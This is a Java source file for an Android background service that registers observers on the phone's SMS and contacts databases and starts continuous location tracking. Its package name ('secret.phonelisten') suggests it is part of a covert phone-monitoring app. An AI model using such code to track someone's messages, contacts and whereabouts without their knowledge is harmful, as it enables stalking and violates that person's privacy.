package com.comsince.secret.phonelisten.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import com.comsince.secret.phonelisten.location.BaseLocationHelper;
import com.comsince.secret.phonelisten.location.LocationHelper;
import com.comsince.secret.phonelisten.observer.PhoneListenObserver;
import com.comsince.secret.ui.MIMIApplication;

/**
 * Created by liaojinlong on 14-11-10.
 */
public class PhoneListenService extends Service{
    public static final String TAG = "PhoneListenService";

    private ContentObserver mObserver;
    Handler handler;
    // 地图定位帮助类
    private LocationHelper mLocationHelper;


    @Override
    public void onCreate() {
        super.onCreate();
        handler = new PhoneListenObserver.SMSHandler(this);
        addObserver();
        addLocaionService();

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    public void addObserver() {
        Log.i(TAG, "add observer. ");
        ContentResolver resolver = getContentResolver();
        mObserver = new PhoneListenObserver(getApplicationContext(), handler);
        //注册短信监听器
        resolver.registerContentObserver(PhoneListenObserver.smsUri, true, mObserver);
        //注册联系人监听器
        resolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI,true,mObserver);
    }

    public void addLocaionService(){
        //启动定位服务
        mLocationHelper = new LocationHelper(handler,getApplicationContext());
        mLocationHelper.requestLocate(BaseLocationHelper.MAP_TYPE_BAIDU);
    }

    @Override
    public void onDestroy() {
        this.getContentResolver().unregisterContentObserver(mObserver);
        mLocationHelper.stopLocate();
        super.onDestroy();
    }
}
